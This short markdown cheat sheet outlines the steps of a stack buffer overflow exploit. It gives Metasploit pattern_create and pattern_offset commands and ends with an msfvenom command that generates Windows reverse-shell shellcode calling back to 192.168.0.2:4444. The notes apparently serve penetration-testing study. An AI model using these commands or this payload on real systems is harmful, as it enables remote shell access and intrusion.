## Buffer Overflow


<img width="499" alt="image" src="https://user-images.githubusercontent.com/79740895/224550622-34264bf4-1bf6-4980-8499-d5afaabcc186.png">


### spiking
### fuzzing


- Create Pattern:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 223

msf-pattern_create  -l 223
```

### Find Offset

```
msf-pattern_offset  -l 3000 -q 386F4337

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

### Overwrite the EIP
### Find Bad Characters
https://github.com/cytopia/badchars

### Finding the right module
### Generating Shellcode
```
msfvenom -p  windows/shell_reverse_tcp LHOST=192.168.0.2 LPORT=4444 EXITFUNC=thread -f c -b "\x00" -a x86
```

